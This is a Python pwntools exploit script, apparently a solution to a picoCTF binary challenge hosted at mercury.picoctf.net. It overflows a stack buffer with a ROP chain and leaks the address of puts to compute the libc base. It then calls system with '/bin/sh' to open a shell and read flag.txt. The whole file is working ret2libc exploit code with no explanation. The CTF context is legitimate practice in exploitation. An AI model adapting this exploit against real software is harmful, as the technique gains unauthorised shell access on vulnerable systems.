#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 1774
HOST = "mercury.picoctf.net"
exe = context.binary = ELF('./vuln_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-2.27.so', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            b* 0x0000000000400703
            b* 0x000000000040076f
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()


# VARIABLE
pop_rdi = 0x0000000000400913
ret = 0x000000000040052e

# PAYLOAD
payload = flat(
    b'a'*0x88,
    pop_rdi, exe.got.puts,
    exe.plt.puts,
    exe.sym.do_stuff
    )
# GDB()
p.sendlineafter(b'sErVeR!\n', payload)

p.recvuntil(b'\n')
libc_leak = u64(p.recv(6) + b'\0'*2)
print("Libc leak: " + hex(libc_leak))
libc.address = libc_leak - libc.sym.puts
print("Libc base: " + hex(libc.address))

payload = flat(
    b'a'*0x88,
    pop_rdi, next(libc.search(b'/bin/sh')),
    ret,
    libc.sym.system
    )
p.sendline(payload)
p.sendline(b'cat flag.txt')

p.interactive()